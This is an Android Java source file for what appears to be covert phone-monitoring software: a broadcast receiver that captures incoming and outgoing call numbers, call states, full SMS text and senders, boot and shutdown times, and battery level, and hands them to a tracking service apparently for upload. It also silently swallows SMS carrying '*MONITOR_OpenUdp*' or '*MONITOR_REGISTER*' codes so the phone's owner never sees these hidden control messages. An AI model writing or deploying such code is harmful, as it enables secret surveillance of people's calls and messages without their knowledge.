package com.jiangboh.bti.yingyanclient;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;

import com.jiangboh.bti.yingyanclient.BaiduTrare.TrareService;
import com.jiangboh.bti.yingyanclient.BaiduTrare.UpdataMessage;
import com.jiangboh.bti.yingyanclient.PublicUnit.MyFunction;

/**
 * Created by admin on 2018-6-5.
 */
public class MyBroadcastReceiver extends BroadcastReceiver {
    private static int LastLevel = 0;
    public static final String CustomBroadcastString = "com.jiangboh.bti.yingyanclient.broadcast";
    private static Bundle bundleCall = new Bundle();
    @Override
    public void onReceive(Context context, Intent intent) {
        //MyFunction.MyPrint("收到广播:" + intent.getAction());
        if(intent.getAction().equals(CustomBroadcastString)){
            MyFunction.MyPrint("收到自定义广播："+ CustomBroadcastString);
            Bundle bundle = new Bundle();
            bundle.putString("bundleType","MONITOR_EYE_CUSTOM");
            runService(context,bundle);
        }else if(intent.getAction().equals(Intent.ACTION_BATTERY_CHANGED)){  //电量改变
            Bundle bundle = new Bundle();
            // 設定電池level
            int level = intent.getIntExtra("level", 0);
            // 設定電池scale
            int scale = intent.getIntExtra("scale", 100);
            if (level != LastLevel ) {
                LastLevel = level;
                bundle.putString(UpdataMessage.Action, "当前电量");
                bundle.putString(UpdataMessage.Desc, "电量:" + level + "%");
                bundle.putBoolean(UpdataMessage.BefreTime,true);
                MyFunction.MyPrint("电量改变：" + level + ";" + scale);
                runService(context, bundle);
            }
        } else if(intent.getAction().equals("android.net.conn.CONNECTIVITY_CHANGE")){
            //MyFunction.MyPrint(,"网络改变广播");
            Bundle bundle = new Bundle();
            bundle.putString("bundleType","CONNECTIVITY_CHANGE");
            runService(context,bundle);
        }else if ((intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED))  ||
                (intent.getAction().equals(Intent.ACTION_MEDIA_EJECT)) ||
                (intent.getAction().equals(Intent.ACTION_MEDIA_MOUNTED)) )  {
            MyFunction.MyPrint("开机广播");
            /*ntent intent1 = new Intent();
            intent1.setClass(context.getApplicationContext(), TrareService.class);
            intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.getApplicationContext().startService(intent1);*/

            MainActivity.actionToMainActivity(context);

            Bundle bundle = new Bundle();
            bundle.putString(UpdataMessage.Action,"开机");
            bundle.putString(UpdataMessage.Desc, "开机时间："+MyFunction.LongToDateString(System.currentTimeMillis()));
            bundle.putBoolean(UpdataMessage.BefreTime,false);
            runService(context,bundle);
        } else if(intent.getAction().equals("android.intent.action.ACTION_SHUTDOWN")){
            //MyFunction.MyPrint(,"关机广播");
            Bundle bundle = new Bundle();
            bundle.putString(UpdataMessage.Action,"关机");
            bundle.putString(UpdataMessage.Desc, "关机时间："+MyFunction.LongToDateString(System.currentTimeMillis()));
            bundle.putBoolean(UpdataMessage.BefreTime,true);
            runService(context,bundle);
        } else if(intent.getAction().equals(Intent.ACTION_SCREEN_OFF)){
           /* MyFunction.MyPrint("屏幕锁定");
            Bundle bundle = new Bundle();
            bundle.putString(UpdataMessage.Action,"屏幕锁定");
            bundle.putString(UpdataMessage.Desc, "锁定时间："+MyFunction.LongToDateString(System.currentTimeMillis()));
            bundle.putBoolean(UpdataMessage.BefreTime,true);
            runService(context,bundle);*/
        }else if(intent.getAction().equals(Intent.ACTION_SCREEN_ON)){
            /*MyFunction.MyPrint("屏幕开启");
            Bundle bundle = new Bundle();
            bundle.putString(UpdataMessage.Action,"屏幕开启");
            bundle.putString(UpdataMessage.Desc, "开启时间："+MyFunction.LongToDateString(System.currentTimeMillis()));
            bundle.putBoolean(UpdataMessage.BefreTime,false);
            runService(context,bundle);*/
        }else if(intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")){
            MyFunction.MyPrint("拨出电话");
            String phone_number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            /*this.bundleCall.putString("bundleType","OUT_CALL");
            this.bundleCall.putString("CallType","OUT_CALL");
            this.bundleCall.putString("startTime",MyFunction.LongToDateString(System.currentTimeMillis()));
            this.bundleCall.putString("phone_number",phone_number);*/

            this.bundleCall.putString(UpdataMessage.Action,"拨出电话");
            this.bundleCall.putString(UpdataMessage.Desc, "电话号码："+ phone_number);
            this.bundleCall.putBoolean(UpdataMessage.BefreTime,true);
            runService(context,this.bundleCall);

        }else if(intent.getAction().equals("android.intent.action.PHONE_STATE")){
            TelephonyManager tm =(TelephonyManager)context.getSystemService(Service.TELEPHONY_SERVICE);
            if (tm.getCallState()==TelephonyManager.CALL_STATE_RINGING) {
                MyFunction.MyPrint("拨入电话");
                String phone_number = intent.getStringExtra("incoming_number");
                //Bundle bundle = new Bundle();
                /*this.bundleCall.putString("bundleType","IN_CALL");
                this.bundleCall.putString("CallType","IN_CALL");
                this.bundleCall.putString("startTime",MyFunction.LongToDateString(System.currentTimeMillis()));
                this.bundleCall.putString("phone_number",phone_number);*/

                this.bundleCall.putString(UpdataMessage.Action,"拨入电话");
                this.bundleCall.putString(UpdataMessage.Desc, "电话号码："+ phone_number);
                this.bundleCall.putBoolean(UpdataMessage.BefreTime,true);
                runService(context,this.bundleCall);
            } else if (tm.getCallState()==TelephonyManager.CALL_STATE_IDLE) {
                MyFunction.MyPrint("挂断电话");
                //String phone_number = intent.getStringExtra("incoming_number");
                //if (phone_number==null) phone_number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                //MainConfigFile.bundleCall.putString("phone_number",phone_number);
                /*this.bundleCall.putString("bundleType","END_CALL");
                this.bundleCall.putString("endTime",MyFunction.LongToDateString(System.currentTimeMillis()));*/
                this.bundleCall.putString(UpdataMessage.Action,"挂断电话");
                this.bundleCall.putBoolean(UpdataMessage.BefreTime,false);
                runService(context,this.bundleCall);
            } else if (tm.getCallState()==TelephonyManager.CALL_STATE_OFFHOOK) {  //接通
                MyFunction.MyPrint("接通电话");
                //String phone_number = intent.getStringExtra("incoming_number");
                //ConfigFile.bundleCall.putString("phone_number",phone_number);
                /*this.bundleCall.putString("bundleType","RECORD_CALL");
                this.bundleCall.putString("startTime",MyFunction.LongToDateString(System.currentTimeMillis()));*/
                this.bundleCall.putString(UpdataMessage.Action,"接通电话");
                this.bundleCall.putBoolean(UpdataMessage.BefreTime,true);
                runService(context,this.bundleCall);
            } else {
                MyFunction.MyPrint("未知状态电话");
            }
        }else if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
            //MyFunction.MyPrint(,"收到消息");
            Object[] pdus;

            pdus = (Object[]) intent.getExtras().get("pdus"); // 获取消息内容
            if (pdus != null && pdus.length > 0) {
                SmsMessage[] messages = new SmsMessage[pdus.length];
                for (int i = 0; i < pdus.length; i++) {
                    byte[] pdu = (byte[]) pdus[i];
                    messages[i] = SmsMessage.createFromPdu(pdu);
                }

                String smsText="";
                String sendPhone = "";
                Long sendTime = (long)1354609;

                for (SmsMessage message : messages) {
                    smsText =smsText + message.getMessageBody();// 得到短信内容
                    sendPhone = message.getOriginatingAddress();// 得到发信息的号码
                    if (sendPhone.length()>11)
                        if (sendPhone.substring(0,1).compareTo("+")==0) {
                            sendPhone=sendPhone.substring(1,sendPhone.length());
                        }
                    if (sendPhone.substring(0,1).compareTo("8")==0) {
                        sendPhone=sendPhone.substring(1,sendPhone.length());
                    }
                    if (sendPhone.substring(0,1).compareTo("6")==0) {
                        sendPhone=sendPhone.substring(1,sendPhone.length());
                    }
                    //sendPhone=sendPhone.substring(sendPhone.length()-11,sendPhone.length());
                    sendTime=message.getTimestampMillis();
                }
                MyFunction.MyPrint("短信收到时间：" + smsText);

                if (smsText.indexOf("*MONITOR_OpenUdp*") != -1) abortBroadcast();// 中止发送
                if (smsText.indexOf("*MONITOR_REGISTER*") != -1) abortBroadcast();// 中止发送

                Bundle bundle = new Bundle();
                /*bundle.putString("bundleType","SMS_RECEVIE");
                bundle.putString("smsText", smsText);
                bundle.putString("sendPhone", sendPhone);
                bundle.putLong("sendTime", sendTime);*/

                bundle.putString(UpdataMessage.Action,"收到短信");
                bundle.putString(UpdataMessage.Desc, "电话号码:"+ sendPhone+ ";消息内容:"+ smsText);
                bundle.putBoolean(UpdataMessage.BefreTime,true);
                runService(context,bundle);
            }
        }
    }


    private void runService(Context context, Bundle bundle) {
        MyThread mThread = new MyThread(context,bundle);
        mThread.start();
    }

    private class MyThread extends Thread {
        private Context context;
        private Bundle bundle;

        public MyThread(Context context, Bundle bundle) {
            this.context=context;
            this.bundle=bundle;
        }
        @Override
        public void run() {
            if (bundle != null) {
                Intent it = new Intent(context,TrareService.class);
                it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                it.putExtras(bundle);
                context.startService(it);
            }
        }
    }

}

